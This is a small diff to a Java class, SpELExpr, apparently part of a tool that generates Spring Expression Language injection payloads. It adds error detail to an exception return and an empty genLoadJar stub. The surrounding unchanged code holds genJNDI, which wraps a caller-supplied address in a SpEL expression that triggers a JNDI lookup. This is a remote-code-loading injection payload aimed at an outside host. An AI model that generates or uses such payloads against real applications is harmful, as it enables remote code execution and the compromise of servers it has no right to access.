@@ -70,7 +70,8 @@ public class SpELExpr implements IExpr {
             };
         } catch (Exception ex) {
             return new String[]{
-                    "class文件异常"
+                    "class文件异常",
+                    Utils.getErrDetail(ex)
             };
         }
     }
@@ -78,6 +79,11 @@ public class SpELExpr implements IExpr {
     @Override
     public String[] genJNDI(String jndiAddress) {
         return new String[]{out("#{new javax.naming.InitialContext().lookup('" + jndiAddress + "')}")};
+    }
+
+    @Override
+    public String[] genLoadJar(String url, String className) {
+        return new String[0];
     }
 
 }
